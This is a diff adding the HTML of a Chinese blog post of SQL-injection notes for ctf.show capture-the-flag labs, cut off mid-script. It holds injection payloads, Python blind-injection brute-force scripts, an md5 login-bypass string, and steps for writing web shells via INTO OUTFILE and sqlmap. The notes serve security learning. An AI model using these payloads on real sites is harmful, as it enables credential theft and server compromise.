@@ -1,0 +1,828 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="最基础的注入-union注入攻击 判断是get型还是post型注入；  找到正确的闭合规则；  order by 查询字段数；  union select 1,2…..查看显示位是第几  第二、三位显示出来了，那么即可在这两个位置写入sql语句；  查询当前数据库,当前mysql用户 union select 1,user(),database()；  查询当前数据库里面的表 union se">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MaskObito">
+<meta property="og:url" content="http://maskobito.github.io/2025/10/10/10.10/index.html">
+<meta property="og:site_name" content="MaskObito">
+<meta property="og:description" content="最基础的注入-union注入攻击 判断是get型还是post型注入；  找到正确的闭合规则；  order by 查询字段数；  union select 1,2…..查看显示位是第几  第二、三位显示出来了，那么即可在这两个位置写入sql语句；  查询当前数据库,当前mysql用户 union select 1,user(),database()；  查询当前数据库里面的表 union se">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://maskobito.github.io/images/bdc8248d3d4e4279b75db756a419de78.png">
+<meta property="og:image" content="http://maskobito.github.io/images/54b80aed0ee3405b910d314abe5c5c0e.png">
+<meta property="og:image" content="http://maskobito.github.io/images/4c49238207a24cd4bbae1f1df0617564.png">
+<meta property="og:image" content="http://maskobito.github.io/images/a55da7a4729e4f0b9e239b2ace7abc3d.png">
+<meta property="og:image" content="http://maskobito.github.io/images/c71b49aac6064b67a95f489801e319bb.png">
+<meta property="og:image" content="http://maskobito.github.io/images/aeab32bab7c149d48e32b7b6923f7f4e.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/5c2336dbb32b5f6e31d3f1344705bb62.png">
+<meta property="article:published_time" content="2025-10-10T14:29:10.545Z">
+<meta property="article:modified_time" content="2025-10-14T13:35:16.554Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://maskobito.github.io/images/bdc8248d3d4e4279b75db756a419de78.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>MaskObito</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/neon.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"maskobito.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[],"type":"particle"},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"language":"zh-CN","enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title">MaskObito</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>信息安全</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>CTF</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于本站</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-10 22:29" pubdate>
+          2025年10月10日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          38 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <hr>
+<hr>
+<h2 id="最基础的注入-union注入攻击"><a href="#最基础的注入-union注入攻击" class="headerlink" title="最基础的注入-union注入攻击"></a>最基础的注入-union注入攻击</h2><ol>
+<li><p>判断是get型还是post型注入；</p>
+</li>
+<li><p>找到正确的闭合规则；</p>
+</li>
+<li><p>order by 查询字段数；</p>
+</li>
+<li><p>union select 1,2…..查看显示位是第几</p>
+</li>
+<li><p>第二、三位显示出来了，那么即可在这两个位置写入sql语句；</p>
+</li>
+<li><p>查询当前数据库,当前mysql用户 <strong><code>union select 1,user(),database()；</code></strong></p>
+</li>
+<li><p>查询当前数据库里面的表 <strong><code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\&quot;data_name\&quot;;</code></strong></p>
+</li>
+<li><p>查询到敏感表名user，继续查询表里面的字段 <strong><code>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\&quot;user\&quot;;</code></strong></p>
+</li>
+<li><p>查询字段，例如“id”、”passwd”的内容 <code>**union select 1,id,passwd from user;**</code></p>
+</li>
+<li><p>拿到用户、密码登入后台。</p>
+</li>
+</ol>
+<h2 id="判断有无过滤"><a href="#判断有无过滤" class="headerlink" title="判断有无过滤"></a>判断有无过滤</h2><p>如靶场178</p>
+<p>利用true&#x3D;1绕过数字，写脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment">#引入requests库</span><br><br>url=<span class="hljs-string">&#x27;http://a605ddd7-54e9-42b9-b318-28890cdfa6e5.challenge.ctf.show/select-waf.php&#x27;</span><br><br><span class="hljs-comment">#url=靶场网站，记得去掉https的s</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br>lsbl = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment">#两个空str变量，用于承载playlod和真正的flag。</span><br><br>str_1 = <span class="hljs-string">&#x27;&#123;0123456789-abcdef&#125;&#x27;</span><br><br><span class="hljs-comment">#flag的组成：09，af，&#123;&#125;，-。这里一定要用&#123;开头，以免误读取其他表的数据，作用是精准定位flag=&gt;ctfshow&#123;??????????????</span><br><br>dick = &#123;<span class="hljs-string">&#x27;0&#x27;</span>:<span class="hljs-string">&#x27;false,&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-string">&#x27;true,&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;2&#x27;</span>:<span class="hljs-string">&#x27;(true+true),&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;3&#x27;</span>:<span class="hljs-string">&#x27;(true+true+true),&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;4&#x27;</span>:<span class="hljs-string">&#x27;(true+true+true+true),&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;5&#x27;</span>:<span class="hljs-string">&#x27;(true+true+true+true+true),&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;6&#x27;</span>:<span class="hljs-string">&#x27;(true+true+true+true+true+true),&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;7&#x27;</span>:<span class="hljs-string">&#x27;(true+true+true+true+true+true+true),&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;8&#x27;</span>:<span class="hljs-string">&#x27;(true+true+true+true+true+true+true+true),&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;9&#x27;</span>:<span class="hljs-string">&#x27;(true+true+true+true+true+true+true+true+true),&#x27;</span><br><br>    &#125;<br><br><span class="hljs-comment">#字典，每个键值都对应了相加的true的个数。</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br><br><span class="hljs-comment">#循环次数</span><br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> str_1:<br><br><span class="hljs-comment">#空变量x遍历flag的组成字符串</span><br><br>    kong = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment">#在此的空字符串变量会在每次循环后再次清空。</span><br><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(x)):<br><br><span class="hljs-comment">#空变量c逐个遍历x，x遍历到&#123;后被ord转换为acsll码123，也就是c遍历123</span><br><br>        kong +=dick[c]<br><br><span class="hljs-comment">#空字符变量+=字典的键值，c变成了键值，首先遍历了1，也就是dick[1]，kong +=true,</span><br><br>    kong = <span class="hljs-string">&#x27;char(concat(&#x27;</span>+kong[:-<span class="hljs-number">1</span>]+<span class="hljs-string">&#x27;)),&#x27;</span><br><br><span class="hljs-comment">#kong再次被赋值为：char(concat(&#x27;+kong[:-1]+&#x27;)),&quot;，由于进行了[:-1]切片操作，所以，true,变成了true，kong目前=char(concat(&#x27;true&#x27;)),</span><br><br>    data=&#123;<br><br>        <span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">&quot;ctfshow_user group by pass having pass regexp(concat(&#123;&#125;))&quot;</span>.<span class="hljs-built_in">format</span>(lsbl+kong[:-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment">#空字符串变量+kong[:-1]，这里又切片了一次，所以是.format(char(concat(&#x27;true&#x27;))) ↑</span><br><br>    &#125;<br><br>    r=requests.post(url=url,data=data)<br><br><span class="hljs-comment">#发生post请求，url=靶场网址，data=修改好的请求体</span><br><br>    http = r.request<br><br>    file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>    file.write(http.body)<br><br><span class="hljs-comment">#这里是为了方便我查看请求体的状态，新建了一个文本文件，w是覆盖式写入，可以查看每一次的请求状态。</span><br><br>    <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="hljs-number">0</span>:<br><br><span class="hljs-comment">#这里都知道，查询到了就捕获这一次的playlod。</span><br><br>        lsbl+=kong<br><br><span class="hljs-comment">#将捕获的playlod追加到空字符变量lsbl中，以便枚举下一个flag的字符。</span><br><br>        flag+=x<br><br><span class="hljs-comment">#将本次匹配到的flag字符串赋值给flag变量</span><br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ctfshow&#x27;</span>+flag)<br><br><span class="hljs-comment">#输出正确的flag字符串</span><br><br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment">#匹配到后，中止内部循环，返回上步循环继续执行。</span><br><br>    <span class="hljs-keyword">else</span>:<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;============错误！&#x27;</span>)<br><br><span class="hljs-comment">#没有匹配到就提示，然后继续下一次的枚举。</span><br><br><span class="hljs-comment">#最后讲一下为什么要切片两次，第一次切片是为了去除连续相加的字典内的true的多余逗号，</span><br><br><span class="hljs-comment">#未切除：char(concat(true,(true+true),(true+true+true),)),</span><br><br><span class="hljs-comment">#切除后：char(concat(true,(true+true),(true+true+true))),</span><br><br><span class="hljs-comment">#第二次是在.format处，这里是为了让本次playlod尝试的语句生效，注意这里没有用+=，而是直接用的=。</span><br><br><span class="hljs-comment">#未切除的playlod：ctfshow_user group by pass having pass regexp(concat(char(concat((true+true+true+true),(true+true+true+true+true+true+true+true))),))</span><br><br><span class="hljs-comment">#切除后的playlod：ctfshow_user group by pass having pass regexp(concat(char(concat((true+true+true+true),(true+true+true+true+true+true+true+true)))))</span><br><br>而在最后<span class="hljs-keyword">if</span>验证成功的+=那里，加的是第二次未切除的playlod，以方便和下一次枚举隔开。<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="md5加密注入"><a href="#md5加密注入" class="headerlink" title="md5加密注入"></a>md5加密注入</h2><p>md5($_POST[‘password’], true) 返回的是 16 字节原始二进制数据，可能包含特殊字符（如 ‘、\0 等）。如果后续直接将这个值拼接到 SQL 查询中，可能导致 SQL 注入。</p>
+<p>md5(“ffifdyop”,true) &#x3D;&gt; ‘or’6É]é!r,ùíb</p>
+<p>那么如果 md5($_POST[‘password’],true) 的返回值为 ‘or’1(除0外任意数字开头)xxx SQL语句将被拼接为:</p>
+<p>$sql&#x3D;”select count(*) from ctfshow_user where username&#x3D;’admin’ and password&#x3D;’’or’1xxx’”;</p>
+<p>用bp抓包admin和ffifdyop即可，如靶场187</p>
+<h2 id="参数无引号包含"><a href="#参数无引号包含" class="headerlink" title="参数无引号包含"></a>参数无引号包含</h2><p>输入0即返回所有字符串开头的结果。如靶场188</p>
+<h2 id="post型爆库"><a href="#post型爆库" class="headerlink" title="post型爆库"></a>post型爆库</h2><p>需要用到post注入，可以写python脚本进行爆破。如靶场183</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment">#import 是 Python 的关键字，用于导入其他模块，requests 是一个流行的 HTTP 请求库，用于发送 HTTP 请求</span><br>url=<span class="hljs-string">&quot;https://a596d2dd-9f31-4bf4-9ef2-fd68c8de3a94.challenge.ctf.show/select-waf.php&quot;</span>   <span class="hljs-comment">#url: 存储目标网址</span><br>strings=<span class="hljs-string">&quot;1234567890abcdef-&#125;&quot;</span>     <span class="hljs-comment">#strings: 包含所有可能出现在密码中的字符</span><br>target=<span class="hljs-string">&quot;ctfshow&#123;&quot;</span>    <span class="hljs-comment">#target: 存储已猜测出的密码部分，初始值为 &quot;ctfshow&#123;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> strings:<br>        payload=<span class="hljs-string">f&quot;(ctfshow_user)where(pass)like&#x27;<span class="hljs-subst">&#123;target+s&#125;</span>%&#x27;&quot;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Python f-string 语法</span><br><span class="hljs-string">f&quot;...&quot; 是 Python 的格式化字符串（f-string），允许在字符串中直接嵌入变量。</span><br><span class="hljs-string">例如，若 target = &quot;ctfshow&#123;&quot;，s = &quot;a&quot;，则 &#123;target+s&#125; 会被替换为 &quot;ctfshow&#123;a&quot;。</span><br><span class="hljs-string">最终生成的 payload 会拼接到 SQL 查询中，假设原始 SQL 是：SELECT * FROM &#123;tableName&#125;;</span><br><span class="hljs-string">而你的 payload 会替换 &#123;tableName&#125;，形成如下查询：SELECT * FROM (ctfshow_user) WHERE (pass) LIKE &#x27;ctfshow&#123;a%&#x27;;</span><br><span class="hljs-string">关键 SQL 语法解释</span><br><span class="hljs-string">(ctfshow_user)：指定表名 ctfshow_user</span><br><span class="hljs-string">WHERE (pass) LIKE &#x27;ctfshow&#123;a%&#x27;：pass 是表中的密码字段,LIKE 是模糊匹配操作符</span><br><span class="hljs-string">&#x27;ctfshow&#123;a%&#x27; 中的 % 是通配符，表示匹配任意后续字符.当你的 payload 是 LIKE &#x27;ctfshow&#123;a%&#x27; 时,ctfshow&#123;a% 会匹配 所有以 ctfshow&#123;a 开头的字符串。例如：ctfshow&#123;a、ctfshow&#123;abc、ctfshow&#123;a1b2c3&#125; 等</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>        data=&#123;<span class="hljs-string">&quot;tableName&quot;</span>:payload&#125;<br>        r=requests.post(url,data)<span class="hljs-comment">#出现问题可以临时禁用证书，r = requests.post(url, data, verify=False)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;$user_count = 1;&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            target+=s<br>            <span class="hljs-built_in">print</span>(target)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> s ==<span class="hljs-string">&quot;&#125;&quot;</span>:<br>            exit()<br></code></pre></td></tr></table></figure>
+
+<p>也可以试着抓post包，一个个字母尝试。</p>
+<h2 id="定向查询时过滤where"><a href="#定向查询时过滤where" class="headerlink" title="定向查询时过滤where"></a>定向查询时过滤where</h2><p>用post型举例</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">tableName=ctfshow_user <span class="hljs-keyword">as</span> a <span class="hljs-keyword">right join</span> ctfshow_user <span class="hljs-keyword">as</span> b <span class="hljs-keyword">on</span> substr(b.pass,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)regexp(<span class="hljs-type">char</span>(<span class="hljs-number">102</span>))<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/bdc8248d3d4e4279b75db756a419de78.png" srcset="/img/loading.gif" lazyload alt="bdc8248d3d4e4279b75db756a419de78"></p>
+<p><img src="/../images/54b80aed0ee3405b910d314abe5c5c0e.png" srcset="/img/loading.gif" lazyload alt="54b80aed0ee3405b910d314abe5c5c0e"></p>
+<p><img src="/../images/4c49238207a24cd4bbae1f1df0617564.png" srcset="/img/loading.gif" lazyload alt="4c49238207a24cd4bbae1f1df0617564"></p>
+<p><img src="/../images/a55da7a4729e4f0b9e239b2ace7abc3d.png" srcset="/img/loading.gif" lazyload alt="a55da7a4729e4f0b9e239b2ace7abc3d"></p>
+<h2 id="知道绝对路径的注入"><a href="#知道绝对路径的注入" class="headerlink" title="知道绝对路径的注入"></a>知道绝对路径的注入</h2><ol>
+<li>如果通过一些方式爆出了网站的根目录，并且知道此站点存在sql注入；</li>
+<li>猜测此数据库可能有file权限，那么我们就可以使用语句：into outfile 来写shell到网站的根目录下，之后用菜刀连接；</li>
+<li>如果数据库没有file权限，那么我们用sqlmap的参数 –is-dba 来查看当前数据库的用户是否有管理员权限；</li>
+<li>如果有管理员权限，我们就可以使用sqlmap里面的参数命令 –os-shell 来上传、反弹shell，最终getshell；</li>
+<li>如果file、管理员权限都没有，那么另寻思路，日志、缓存写入等。</li>
+</ol>
+<p><strong>如靶场175</strong></p>
+<p>通常，SQL注入可以通过 UNION SELECT 直接回显数据</p>
+<p>如果网页会显示查询结果，这样就能直接看到 password。</p>
+<p>但有些题目会禁用回显（比如只返回 查询成功&#x2F;失败，不显示数据），这时就需要其他方式获取数据：</p>
+<p>时间盲注（SLEEP() + 布尔判断，逐字符猜解，速度慢）</p>
+<p>报错注入（利用 extractvalue() 或 updatexml() 报错回显）</p>
+<p>文件导出（INTO OUTFILE 直接写入文件，效率最高）</p>
+<p>如果题目不允许直接回显数据，但允许文件写入，INTO OUTFILE 就是最佳选择。<br><code>&#39; union select 1,password from ctfshow_user5 where username=&#39;flag&#39; into outfile &#39;/var/www/html/ctf.txt&#39;--</code> </p>
+<p>打开网址&#x2F;ctf.txt即可获得flag</p>
+<h2 id="Boolean注入攻击-布尔盲注"><a href="#Boolean注入攻击-布尔盲注" class="headerlink" title="Boolean注入攻击-布尔盲注"></a>Boolean注入攻击-布尔盲注</h2><ul>
+<li>查看现象，能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，只存在两种状态，对或错；</li>
+<li>由页面的两种不同返回的状态来判定我们的闭合规则；</li>
+<li>为了方便，我们这里假设返回正确用“yes”，返回错误用“no”来表示这两种状态</li>
+<li>找到闭合规则后，我们在闭合规则里面 <strong><code>and 1=1 和 and 1=2</code></strong> 测试一下，看看最后返回是不是两种状态；</li>
+<li>布尔盲注要用到**<code>length()和substr()</code>**语句，用两种状态来猜解数据库、表名等的长度和正确字母；</li>
+<li>先用 <strong><code>and length(database())&gt;2</code></strong> 来猜数据库的长度，使用的是二分法；</li>
+<li>再用 **<code>and substr(database(),1,1)=\&#39;t\&#39; </code>**来确定第一个字母，可用burp跑，26个字母,哪个字母返回yes则代表第一个字母就是它；</li>
+<li>**<code>and substr(database(),2,1)=\&#39;t\&#39; </code>**代表当前数据库的第二个字母；</li>
+<li>最后结合长度，成功的将数据库猜解出来；</li>
+<li>后面的操作跟union注入的步骤差不多了，只是sql语句写在 上文的 database() 处。</li>
+</ul>
+<p>如靶场190</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://4c51b3f3-6192-4451-8ebb-142692ea214e.challenge.ctf.show/api/&quot;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i = i + <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        